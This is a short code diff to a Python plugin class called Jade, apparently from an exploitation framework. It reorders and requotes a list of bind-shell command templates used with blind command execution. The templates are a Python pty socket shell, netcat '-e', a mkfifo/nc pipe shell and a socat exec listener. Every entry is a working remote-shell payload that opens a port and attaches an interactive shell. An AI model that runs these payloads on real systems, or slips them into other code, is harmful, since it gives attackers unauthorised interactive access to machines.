@@ -50,9 +50,9 @@ class Jade(Plugin):
         'tcp_shell' : {
             'call' : 'execute_blind',
             'tcp_shell': [
+                """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\\"\\", %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn(\\"%(shell)s\\");s.close()'""",
                 """nc -l -p %(port)s -e %(shell)s""",
                 """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc -l %(port)s >/tmp/f; rm -rf /tmp/f""",
-                """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\'\', %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn(\'%(shell)s\');s.close()';""",
                 """socat tcp-l:%(port)s exec:%(shell)s"""
             ]
         }
